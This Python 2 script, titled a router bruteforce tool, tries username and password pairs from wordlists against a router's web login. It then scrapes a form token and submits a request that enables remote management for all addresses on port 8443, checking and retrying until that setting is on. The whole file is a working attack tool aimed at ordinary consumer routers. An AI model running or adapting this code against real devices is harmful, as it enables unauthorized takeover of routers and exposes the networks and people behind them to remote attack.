import requests
import re
import time
import argparse

parser = argparse.ArgumentParser(description='PORTAL - Router Bruteforce Tool')
parser.add_argument('ip', type=str, help='ip address of target router')
args = parser.parse_args()

target_ip = args.ip

user_names = []
passwords = []

f = open('users.txt','r')
data = f.readlines()

user_names = [user.strip() for user in data]

f = open('passwords.txt','r')
data = f.readlines()

passwords = [password.strip() for password in data]

print 'Loaded users: {}'.format(user_names)
print 'Loaded passwords: {}'.format(passwords)

# Maximum number of times to try enable remote management
max_attempts = 10
target_page = 'FW_remote.htm'
rmport = 8443

# Headers
pragma = 'no-cache'
accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
acceptlang = 'en-us'
acceptenc = 'gzip, deflate'
contenttype = 'application/x-www-form-urlencoded'
origin = 'http://192.168.1.1'
ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15'
uir = '1'
ref = 'http://{}/{}'.format(target_ip, target_page)

headers = {
    'Pragma': pragma,
    'Accept': accept,
    'Accept-Language': acceptlang,
    'Cache-Control': "no-cache",
    'Accept-Encoding': acceptenc,
    'Content-Type': contenttype,
    'Origin': origin,
    'User-Agent': ua,
    'Upgrade-Insecure-Requests': uir,
    'Referer': ref,
}


# Get timestamp token and verify credentials
timestamp = None
verified_user = None
verified_pass = None

for user in user_names:
    for password in passwords:
        url = 'http://{}:{}@{}/{}'.format(user, password, target_ip, target_page)
        print '[-] Trying: {}'.format(url)

        r = requests.get(url)

        if r.status_code == 200 and '401 Authorization' not in r.text:
            print '[+] Found correct user and password: {}:{}'.format(user, password)
            verified_user = user
            verified_pass = password

            # print '[-] Searching for timestamp in: {}'.format(r.text)
            m = re.search('timestamp=(.*)\"', r.text)
            if m:
                timestamp = int(m.group(1))
                print '[+] Found timestamp: {}'.format(timestamp)
            break

        time.sleep(0.2)

    if verified_user and verified_pass:
        break

if not verified_user and not verified_pass:
    print '[!] Could not find router credentials.'
    exit()

if not timestamp:
    print '[!] Could not find timestamp token value.'
    exit()

def enable_rm():
    page = 'apply.cgi?/FW_remote.htm%20timestamp={}'.format(timestamp)
    url = 'http://{}:{}@{}/{}'.format(verified_user, verified_pass, target_ip, page)

    data = {
        'submit_flag': 'remote',
        'http_rmenable': '1',
        'local_ip': '...',
        'remote_mg_enable': '0',
        'rm_access': 'all',
        'http_rmport': str(rmport)
    }

    print '[-] Attempting to enable remote management'
    print '[-] Request data: {}'.format(data)

    return requests.post(url, headers=headers, data=data)

r = enable_rm()

if r.status_code == 200:
    print '[+] Successfully submitted request'

def verify_rm():
    page = 'FW_remote.htm'
    url = 'http://{}:{}@{}/{}'.format(verified_user, verified_pass, target_ip, page)

    print '[-] Verifying remote management is enabled'
    r = requests.get(url)
    if r.status_code == 200:
        m = re.search('var remote_access=\'(.*)\';', r.text)
        pt = re.search('var remote_port=\"(.*)\";', r.text)
        ip = re.search('var remote_manage_ip=\"(.*)\";', r.text)
        remote_management = m.group(1)

        remote_port = pt.group(1)
        remote_ip = ip.group(1)
        # print '[+] Found remote_management variable: {}'.format(remote_management)
        if remote_management == '2':
            print '[+] Remote management: Enabled'
            print '[+] Remote IP: {}'.format(remote_ip)
            print '[+] Remote port: {}'.format(remote_port)
            return True
        if remote_management == '0':
            print '[+] Remote management: Disabled'
            return False
        else:
            print '[+] Remote management: Unknown'
            return False

attempts = max_attempts

while not verify_rm():
    attempts = attempts - 1
    r = enable_rm()
    if r.status_code == 200:
        print '[+] Successfully enabled remote management at port: {}'.format(rmport)
    else:
        print '[+] Remote management not enabled. (attempts remaining: {})'.format(attempts)

    if attempts == 0:
        break
